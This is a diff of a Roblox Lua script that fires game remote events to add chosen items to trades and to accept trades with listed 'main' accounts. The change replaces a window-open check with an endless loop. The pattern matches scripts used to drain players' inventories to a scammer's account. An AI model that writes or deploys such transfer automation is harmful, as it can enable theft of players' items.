@@ -1,7 +1,6 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 
 -- =================================================
@@ -72,39 +71,15 @@ local function acceptTradeForAll()
     end
 end
 
--- Function to check if the Trade GUI window is open and visible
-local function isTradeWindowOpen()
-    local tradeApp = PlayerGui:FindFirstChild("TradeApp")
-    if tradeApp then
-        return tradeApp.Enabled == true
-    end
-    return false
-end
-
--- Task 1: Automatically add items once the Trade GUI pops up
+-- Task 1: Continuously try to add items in a background loop
 task.spawn(function()
-    local addedInThisTrade = false
-    
     while true do
-        if isTradeWindowOpen() then
-            if not addedInThisTrade then
-                task.wait(0.5) -- Brief pause for trade window synchronization
-                local uniqueIds = getUniqueIdsByName(TARGET_ITEM_NAME, ITEM_LIMIT)
-                
-                for _, uniqueId in ipairs(uniqueIds) do
-                    pcall(function()
-                        addItemRemote:FireServer(uniqueId)
-                    end)
-                    task.wait(0.05) -- Small delay to prevent rate-limiting or dropping remote calls
-                end
-                
-                addedInThisTrade = true
-            end
-        else
-            -- Reset flag when the trade window closes so it functions for future trades
-            addedInThisTrade = false
+        local uniqueIds = getUniqueIdsByName(TARGET_ITEM_NAME, ITEM_LIMIT)
+        for _, uniqueId in ipairs(uniqueIds) do
+            pcall(function()
+                addItemRemote:FireServer(uniqueId)
+            end)
         end
-
         task.wait(0.5)
     end
 end)
@@ -112,6 +87,7 @@ end)
 -- Task 2: Handle trade requests and auto-accepting
 task.spawn(function()
     while true do
+        -- Only loop if names are provided and not empty
         if MainAccUsername and #MainAccUsername > 0 and MainAccUsername[1] ~= "" then
             for _, playerName in ipairs(MainAccUsername) do
                 if Players:FindFirstChild(playerName) then
